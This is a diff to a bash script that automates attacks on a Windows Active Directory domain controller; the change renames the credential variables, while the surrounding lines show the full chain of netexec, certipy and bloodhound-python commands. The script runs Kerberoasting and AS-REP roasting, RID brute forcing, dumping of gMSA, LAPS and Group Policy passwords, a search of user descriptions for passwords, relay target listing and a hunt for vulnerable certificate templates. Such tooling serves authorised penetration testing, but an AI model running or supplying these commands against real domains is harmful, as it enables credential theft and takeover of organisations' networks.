@@ -13,16 +13,16 @@ set -uo pipefail
 DC_IP="${1:-}"
 DOMAIN="${2:-}"
 shift 2 2>/dev/null || true
-USER=""
-PASS=""
+AD_USER=""
+AD_PASS=""
 while [[ $# -gt 0 ]]; do
     case "$1" in
         -u)
             if [[ $# -lt 2 ]]; then echo "[!] -u requires an argument" >&2; exit 1; fi
-            USER="$2"; shift 2 ;;
+            AD_USER="$2"; shift 2 ;;
         -p)
             if [[ $# -lt 2 ]]; then echo "[!] -p requires an argument" >&2; exit 1; fi
-            PASS="$2"; shift 2 ;;
+            AD_PASS="$2"; shift 2 ;;
         *) shift ;;
     esac
 done
@@ -80,9 +80,9 @@ if command -v nxc >/dev/null 2>&1; then
     nxc ldap "$DC_IP" -u '' -p '' --asreproast "$OUT/asrep.hash" >"$OUT/asrep-nullbind.log" 2>&1
 fi
 
-if [[ -n "$USER" && -n "$PASS" ]]; then
+if [[ -n "$AD_USER" && -n "$AD_PASS" ]]; then
     echo
-    echo "###### Authenticated stages (as $USER) ######"
+    echo "###### Authenticated stages (as $AD_USER) ######"
 
     if ! command -v nxc >/dev/null 2>&1; then
         echo "[!] nxc (netexec) not found -- authenticated stages require it. pipx install git+https://github.com/Pennyw0rth/NetExec" >&2
@@ -90,62 +90,62 @@ if [[ -n "$USER" && -n "$PASS" ]]; then
     fi
 
     echo "[*] LDAP user listing"
-    nxc ldap "$DC_IP" -u "$USER" -p "$PASS" --users >"$OUT/ldap-users.log" 2>&1
+    nxc ldap "$DC_IP" -u "$AD_USER" -p "$AD_PASS" --users >"$OUT/ldap-users.log" 2>&1
 
     echo "[*] SMB RID brute (more usernames)"
-    nxc smb "$DC_IP" -u "$USER" -p "$PASS" --rid-brute >"$OUT/rid-brute.log" 2>&1
+    nxc smb "$DC_IP" -u "$AD_USER" -p "$AD_PASS" --rid-brute >"$OUT/rid-brute.log" 2>&1
 
     echo "[*] Kerberoasting"
-    nxc ldap "$DC_IP" -u "$USER" -p "$PASS" --kerberoasting "$OUT/kerberoast.hash" >"$OUT/kerberoast.log" 2>&1
+    nxc ldap "$DC_IP" -u "$AD_USER" -p "$AD_PASS" --kerberoasting "$OUT/kerberoast.hash" >"$OUT/kerberoast.log" 2>&1
 
     echo "[*] AS-REP roasting (authenticated, broader than the null-bind sweep)"
-    nxc ldap "$DC_IP" -u "$USER" -p "$PASS" --asreproast "$OUT/asrep-auth.hash" >"$OUT/asrep-auth.log" 2>&1
+    nxc ldap "$DC_IP" -u "$AD_USER" -p "$AD_PASS" --asreproast "$OUT/asrep-auth.hash" >"$OUT/asrep-auth.log" 2>&1
 
     echo "[*] Password/lockout policy"
-    nxc smb "$DC_IP" -u "$USER" -p "$PASS" --pass-pol >"$OUT/pass-pol.log" 2>&1
+    nxc smb "$DC_IP" -u "$AD_USER" -p "$AD_PASS" --pass-pol >"$OUT/pass-pol.log" 2>&1
 
     echo "[*] Disabled accounts (raw LDAP query, no dedicated nxc flag exists)"
-    nxc ldap "$DC_IP" -u "$USER" -p "$PASS" \
+    nxc ldap "$DC_IP" -u "$AD_USER" -p "$AD_PASS" \
         --query "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" "sAMAccountName" \
         >"$OUT/disabled-accounts.log" 2>&1
 
     echo "[*] SMB share enumeration"
-    nxc smb "$DC_IP" -u "$USER" -p "$PASS" --shares >"$OUT/shares.log" 2>&1
+    nxc smb "$DC_IP" -u "$AD_USER" -p "$AD_PASS" --shares >"$OUT/shares.log" 2>&1
 
     echo "[*] SMB signing check (relay target list)"
-    nxc smb "$DC_IP" -u "$USER" -p "$PASS" --gen-relay-list "$OUT/relay-targets.txt" >"$OUT/smb-signing.log" 2>&1
+    nxc smb "$DC_IP" -u "$AD_USER" -p "$AD_PASS" --gen-relay-list "$OUT/relay-targets.txt" >"$OUT/smb-signing.log" 2>&1
 
     echo "[*] Delegation-trust listing"
-    nxc ldap "$DC_IP" -u "$USER" -p "$PASS" --trusted-for-delegation >"$OUT/delegation.log" 2>&1
+    nxc ldap "$DC_IP" -u "$AD_USER" -p "$AD_PASS" --trusted-for-delegation >"$OUT/delegation.log" 2>&1
 
     echo "[*] gMSA password read attempt"
-    nxc ldap "$DC_IP" -u "$USER" -p "$PASS" --gmsa >"$OUT/gmsa.log" 2>&1
+    nxc ldap "$DC_IP" -u "$AD_USER" -p "$AD_PASS" --gmsa >"$OUT/gmsa.log" 2>&1
 
     echo "[*] Description field password grep"
-    nxc ldap "$DC_IP" -u "$USER" -p "$PASS" \
+    nxc ldap "$DC_IP" -u "$AD_USER" -p "$AD_PASS" \
         --query "(objectClass=user)" "sAMAccountName description" \
         >"$OUT/user-descriptions.log" 2>&1
 
     echo "[*] GPP cpassword sweep"
-    nxc smb "$DC_IP" -u "$USER" -p "$PASS" -M gpp_password >"$OUT/gpp-password.log" 2>&1
-    nxc smb "$DC_IP" -u "$USER" -p "$PASS" -M gpp_autologin >"$OUT/gpp-autologin.log" 2>&1
+    nxc smb "$DC_IP" -u "$AD_USER" -p "$AD_PASS" -M gpp_password >"$OUT/gpp-password.log" 2>&1
+    nxc smb "$DC_IP" -u "$AD_USER" -p "$AD_PASS" -M gpp_autologin >"$OUT/gpp-autologin.log" 2>&1
 
     echo "[*] LAPS read"
     # --laps is an smb/winrm-only auth-helper flag in current netexec, not an ldap flag -- the
     # actual bulk LDAP LAPS-password dump (incl. LAPS v2 msLAPS-EncryptedPassword decryption) is
     # the 'laps' module.
-    nxc ldap "$DC_IP" -u "$USER" -p "$PASS" -M laps >"$OUT/laps.log" 2>&1
+    nxc ldap "$DC_IP" -u "$AD_USER" -p "$AD_PASS" -M laps >"$OUT/laps.log" 2>&1
 
     echo "[*] ADCS triage"
-    nxc ldap "$DC_IP" -u "$USER" -p "$PASS" -M adcs >"$OUT/adcs-triage.log" 2>&1
+    nxc ldap "$DC_IP" -u "$AD_USER" -p "$AD_PASS" -M adcs >"$OUT/adcs-triage.log" 2>&1
     if command -v certipy >/dev/null 2>&1 && grep -q 'Found PKI' "$OUT/adcs-triage.log" 2>/dev/null; then
         echo "  CA indicator found -- running certipy find -vulnerable"
-        certipy find -u "${USER}@${DOMAIN}" -p "$PASS" -dc-ip "$DC_IP" -vulnerable -stdout >"$OUT/certipy-find.log" 2>&1
+        certipy find -u "${AD_USER}@${DOMAIN}" -p "$AD_PASS" -dc-ip "$DC_IP" -vulnerable -stdout >"$OUT/certipy-find.log" 2>&1
     fi
 
     if command -v bloodhound-python >/dev/null 2>&1; then
         echo "[*] BloodHound collection (DCOnly)"
-        bloodhound-python -c DCOnly -u "$USER" -p "$PASS" -d "$DOMAIN" -ns "$DC_IP" \
+        bloodhound-python -c DCOnly -u "$AD_USER" -p "$AD_PASS" -d "$DOMAIN" -ns "$DC_IP" \
             --zip -op "$OUT/bloodhound" >"$OUT/bloodhound.log" 2>&1
         echo "  -> import the resulting .zip into the BloodHound GUI; this script does not interpret DACL/edge data itself."
     fi
